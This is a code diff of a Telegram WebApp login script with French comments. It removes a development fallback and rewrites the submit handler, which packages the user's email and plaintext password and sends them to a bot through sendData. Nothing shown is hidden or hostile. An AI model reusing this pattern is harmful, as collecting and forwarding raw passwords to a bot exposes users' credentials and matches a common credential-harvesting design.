@@ -1,21 +1,5 @@
 // Initialisation de l'application Telegram WebApp
-let tg;
-try {
-    tg = window.Telegram.WebApp;
-} catch (e) {
-    console.log('Running in development mode');
-    // Mode développement pour tester sans Telegram
-    tg = {
-        sendData: function(data) {
-            console.log('Data would be sent:', data);
-            alert('Données envoyées avec succès!');
-        },
-        close: function() {
-            console.log('App would close');
-            alert('Application fermée');
-        }
-    };
-}
+let tg = window.Telegram.WebApp;
 
 // Fonction pour valider l'email
 function validateEmail(email) {
@@ -48,11 +32,17 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         return;
     }
     
-    // Envoi des données au bot
-    tg.sendData(JSON.stringify({
+    // Préparation des données
+    const formData = {
         email: email,
         password: password
-    }));
+    };
+
+    // Envoi des données au bot Telegram
+    tg.sendData(JSON.stringify(formData));
+    
+    // Afficher un message de confirmation
+    alert('Données envoyées avec succès!');
 });
 
 // Gestionnaire du bouton de fermeture
